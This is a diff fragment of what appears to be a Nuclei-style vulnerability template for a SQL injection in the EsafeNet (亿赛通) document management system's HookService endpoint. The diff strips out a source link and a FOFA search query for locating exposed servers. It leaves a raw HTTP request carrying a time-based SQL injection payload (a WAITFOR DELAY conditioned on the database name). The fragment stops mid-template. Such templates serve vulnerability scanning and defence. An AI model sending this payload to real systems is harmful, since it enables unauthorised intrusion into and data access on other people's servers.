@@ -3,12 +3,8 @@ info:
   name: 亿赛通电子文档管理系统EsafeNet HookService存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fkwkgg6heeanw02q'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fkwkgg6heeanw02q
-    fofa: body="/CDGServer3/index.jsp"
 http:
 - raw:
   - 'GET /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1%27;if(db_name()=%27CobraDGServer%27)+WAITFOR+DELAY+%270:0:5%27--  HTTP/1.1
